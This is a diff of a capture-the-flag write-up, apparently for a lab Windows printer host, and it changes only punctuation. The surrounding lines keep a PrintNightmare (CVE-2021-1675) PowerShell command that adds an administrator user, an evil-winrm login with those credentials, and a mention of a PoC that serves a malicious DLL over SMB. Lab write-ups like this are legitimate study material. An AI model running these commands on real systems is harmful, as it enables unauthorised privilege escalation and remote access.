@@ -26,7 +26,7 @@ Service Info: Host: DRIVER; OS: Windows
 |_  message_signing: disabled (dangerous, but default)
 ```
 
-The HTTP auth realm says "MFP Firmware Update Center" -- printer management portal. WinRM is open on 5985, so credentials mean a shell.
+The HTTP auth realm says "MFP Firmware Update Center", printer management portal. WinRM is open on 5985, so credentials mean a shell.
 
 **Dead end - SMB anonymous enum:** Anonymous sessions rejected, nothing came back.
 
@@ -174,7 +174,7 @@ powershell -ep bypass -c ". .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'hack
 
 ### 3.3 Root
 
-Open a new terminal. If the box reset the IP will have changed -- connect to whatever it respawned as.
+Open a new terminal. If the box reset the IP will have changed, connect to whatever it respawned as.
 
 ```bash
 evil-winrm -i 10.129.76.234 -u hacker -p 'Hacker123!'
@@ -187,7 +187,7 @@ evil-winrm -i 10.129.76.234 -u hacker -p 'Hacker123!'
 redacted
 ```
 
-### Alternative -- cube0x0 Python PoC
+### Alternative: cube0x0 Python PoC
 
 The cube0x0 Python version works by hosting `nightmare.dll` on an SMB share and passing it to the target. It ran here but the named pipe kept closing before the DLL loaded:
 
